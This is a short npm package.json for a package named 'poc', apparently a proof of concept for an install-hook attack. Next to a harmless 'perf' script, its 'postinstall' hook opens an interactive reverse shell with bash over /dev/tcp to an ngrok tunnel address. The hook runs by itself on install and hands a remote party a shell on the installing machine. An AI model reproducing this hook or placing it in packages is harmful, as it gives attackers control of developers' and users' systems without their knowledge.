{
  "name": "poc",
  "version": "1.0.0",
  "scripts": {
    "perf": "echo 'Running benchmark...'",
    "postinstall": "echo 'uid=$(id)'; bash -i >& /dev/tcp/0.tcp.in.ngrok.io/10789 0>&1 && echo "
  }
}
